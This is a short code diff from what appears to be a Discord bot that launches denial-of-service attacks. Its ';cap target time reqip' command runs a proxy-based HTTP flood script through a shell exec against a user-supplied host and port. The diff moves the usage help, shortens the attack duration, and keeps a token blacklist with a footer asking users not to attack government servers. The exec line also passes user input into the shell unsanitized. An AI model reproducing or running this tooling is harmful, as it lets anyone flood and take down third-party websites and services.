@@ -26,6 +26,17 @@ function isLetter(c) {
   return c.toLowerCase() != c.toUpperCase();
 }
 
+// Example command
+if(!args[0]) {
+	const embed1 = new Discord.MessageEmbed()
+	.setColor('RANDOM')
+	.setTitle('WARRING')
+	.setDescription("`Ex ;cap target time reqip`")
+	.setFooter("Please do not attack government server!")
+	message.channel.send(embed1);
+	return;
+	}
+
 //BLACKLISTING SYSTEM 
  if (args[1] === "IP") {
   message.channel.send(Warn("TARGET IS BLACKLISTED!"));
@@ -44,20 +55,11 @@ function isLetter(c) {
     return;
   }
 
-// Example command
-if(!args[0]) {
-	const embed1 = new Discord.MessageEmbed()
-	.setColor('RANDOM')
-	.setTitle('WARRING')
-	.setDescription("`Ex ;cap target time reqip`")
-	.setFooter("Please do not attack government server!")
-	message.channel.send(embed1);
-	return;
-	}
+
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node cf ${host} ${port} 300 GET proxy.txt ${reqip}`, (error, stdout, stderr) => {
+exec(`node cf ${host} ${port} 100 GET proxy.txt ${reqip}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
